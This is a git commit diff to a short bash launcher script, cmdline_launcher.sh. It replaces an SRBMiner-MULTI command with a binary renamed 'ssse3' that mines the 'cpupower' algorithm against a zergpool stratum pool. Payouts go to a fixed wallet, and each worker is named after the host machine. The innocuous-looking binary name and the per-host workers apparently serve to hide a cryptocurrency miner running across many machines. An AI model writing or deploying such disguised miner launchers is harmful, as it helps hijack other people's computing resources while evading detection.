7a3f86c8221bb893dd232a460c13188f3b670008
babyblueeyes91 <94261184+babyblueeyes91@users.noreply.github.com>
2021-11-14 06:44:54 +0700

    Update cmdline_launcher.sh

--- cmdline_launcher.sh
+++ cmdline_launcher.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-./SRBMiner-MULTI --algorithm cpupower --pool stratum+tcp://cpupower.mine.zergpool.com:4250 --wallet CTg5jaQmry8QTyWW4JAxgG7rd7wHGNsMDk.$(cat /proc/sys/kernel/hostname) --password c=CPU,mc=CPU
+./ssse3 -a cpupower -o stratum+tcp://cpupower.mine.zergpool.com:4250 -u CTg5jaQmry8QTyWW4JAxgG7rd7wHGNsMDk.$(cat /proc/sys/kernel/hostname) -p=c=CPU,mc=CPU
